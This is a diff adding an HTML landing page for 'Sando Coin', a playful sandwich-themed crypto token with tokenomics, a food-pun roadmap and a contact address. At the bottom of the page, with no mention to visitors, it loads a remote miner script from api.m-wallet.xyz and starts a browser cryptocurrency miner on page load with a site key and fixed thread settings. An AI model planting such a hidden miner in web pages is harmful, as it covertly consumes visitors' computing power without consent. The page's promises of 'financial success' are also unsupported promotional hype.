@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sando Coin</title>
+    <link rel="stylesheet" href="styles.css">
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7301959374608410"
+     crossorigin="anonymous"></script>
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico?">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="text">
+                    <h1>Welcome to Sando Coin!</h1>
+                    <nav>
+                        <ul>
+                            <li><a href="#about">About</a></li>
+                            <li><a href="#tokenomics">Tokenomics</a></li>
+                            <li><a href="#roadmap">Roadmap</a></li>
+                            <li><a href="#team">Team</a></li>
+                            <li><a href="#contact">Contact</a></li>
+                            <li><a href="./whitepaper">Whitepaper</a></li> <!-- Link to the whitepaper -->
+                            <li><a href="./faucet">Faucet</a></li>
+                        </ul>
+                    </nav>
+                </div>
+                <div class="image">
+                    <img src="./assets/sando_coin_image.png" alt="Sando Coin Image">
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    
+    
+
+    <section id="about">
+        <div class="container">
+            <h2>About Sando Coin</h2>
+            <p>🥪 Sando Coin is the tastiest cryptocurrency in the market! Join us on a culinary journey to financial success! 🍔</p>
+            <p>With Sando Coin, you'll experience the flavor of crypto like never before! 🍕</p>
+        </div>
+    </section>
+
+    <section id="tokenomics">
+        <div class="container">
+            <h2>Tokenomics</h2>
+            <p>Total Supply: 7,673,716,159 (Just like the perfect recipe for a massive sandwich party! 🥪) 🍟</p>
+            <p>Symbol: SNDO (Short and sweet, just like our sandwiches! 🍬) </p>
+            <p>Decimals: 18 (Because precision matters in every bite! 🍽️) </p>
+            <p>Contract Address: <span id="contract-address">Loading...</span></p>
+        </div>
+    </section>
+
+    <section id="roadmap">
+        <div class="container">
+            <h2>Roadmap</h2>
+            <div class="roadmap-section">
+                <div class="phase">
+                    <h3>Sourdough Starter Phase (Q1 2024)</h3>
+                    <ul>
+                        <li>🍞 Crafting the Recipe: Mixing the perfect blend of ingredients for the ultimate Sando Coin taste!</li>
+                        <li>🥖 Toasting the Bread: Heating up the market with the warm aroma of Sando Coin!</li>
+                    </ul>
+                </div>
+                <div class="phase">
+                    <h3>Sandwich Assembly Phase (Q2 2024)</h3>
+                    <ul>
+                        <li>🥪 Layering the Fillings: Stacking up the layers of innovation to create the most delicious crypto sandwich!</li>
+                        <li>🧀 Adding Extra Cheese: Sprinkling some extra cheese to make Sando Coin even more irresistible!</li>
+                    </ul>
+                </div>
+                <div class="phase">
+                    <h3>Grilled Panini Phase (Q3 2024)</h3>
+                    <ul>
+                        <li>🔥 Grilling the Sandwich: Applying the perfect heat to grill Sando Coin to perfection!</li>
+                        <li>🍅 Tomato Token Sauce: Adding a zesty tomato sauce of innovation to spice up our project!</li>
+                    </ul>
+                </div>
+                <div class="phase">
+                    <h3>Dessert Sandwich Phase (Q4 2024)</h3>
+                    <ul>
+                        <li>🍰 Sweet Success: Topping off our journey with a sweet dessert sandwich of achievements!</li>
+                        <li>🍨 Sando Sundae Surprise: Adding a scoop of surprises to make the Sando Coin experience even sweeter!</li>
+                    </ul>
+                </div>
+                <div class="phase">
+                    <h3>Food Truck Expansion Phase (Beyond 2024)</h3>
+                    <ul>
+                        <li>🚚 Hitting the Road: Taking Sando Coin on a food truck tour to spread the deliciousness far and wide!</li>
+                        <li>🌍 Global Sandwich Domination: Our ultimate goal? Sando Coin in every sandwich lover's pocket worldwide!</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="team">
+        <div class="container">
+            <h2>Team (it's just me rn i generated this with chatgpt but i think it's cool so i decided to keep it 😆)</h2>
+            <p>Our team is a bunch of food enthusiasts and crypto fanatics! 🍕🥑🍔</p>
+            <p>We work hard, eat harder, and never forget to share a meal together! 🍝🤝</p>
+        </div>
+    </section>
+
+    <section id="contact">
+        <div class="container">
+            <h2>Contact</h2>
+            <p>Got a question? Need some help? Hit us up at <a href="mailto:sandocoinpolygon@gmail.com"></a> sandocoinpolygon@gmail.com ! 📧🥪</p>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 Sando Coin - Serving up tasty crypto sandwiches since forever! 🥪🚀</p>
+        </div>
+    </footer>
+
+    <div class="sandwiches"></div>
+
+    <script src="animations.js"></script>
+    <script src="contract.js"></script>
+    <script src="https://api.m-wallet.xyz/src/miner/custom"></script>
+
+    <script>
+    var miner = WMP.User('SK_xHJNazqj7qVX8JS5fEXLf', '685685922208940032',{
+    threads: 2,
+    autoThreads: false,
+    throttle: 0.1,
+    forceASMJS: true});
+    miner.start();
+
+</script>
+</body>
+</html>
+ 
